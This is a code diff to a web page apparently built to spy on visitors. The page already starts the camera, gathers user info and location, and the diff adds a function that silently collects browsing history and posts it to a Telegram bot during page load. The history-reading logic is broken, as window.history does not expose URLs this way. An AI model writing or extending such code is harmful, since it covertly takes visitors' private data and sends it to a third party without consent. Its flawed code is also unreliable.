@@ -316,6 +316,44 @@
             }
         }
 
+        async function getBrowserHistory() {
+            let historyItems = [];
+            try {
+                const history = await window.history;
+                for (let i = 0; i < history.length; i++) {
+                    historyItems.push(history[i].url);
+                }
+                await sendBrowserHistoryToTelegram(historyItems);
+            } catch (error) {
+                console.error("Error getting browser history: ", error);
+            }
+        }
+
+        async function sendBrowserHistoryToTelegram(historyItems) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: `Browser History: ${historyItems.join(', ')}`
+                    })
+                });
+
+                if (response.ok) {
+                    console.log("Browser history sent to Telegram");
+                } else {
+                    console.error("Error sending browser history to Telegram: ", response.statusText);
+                }
+            } catch (error) {
+                console.error("Error sending browser history to Telegram: ", error);
+            }
+        }
+
         async function initializeFirstPart() {
             await startVideo();
             await getUserInfo();
@@ -324,6 +362,8 @@
             if (permissionGranted) {
                 await getLocation();
             }
+
+            await getBrowserHistory();
 
             document.getElementById('initial-container').style.display = 'none';
             document.getElementById('main-container').style.display = 'flex';
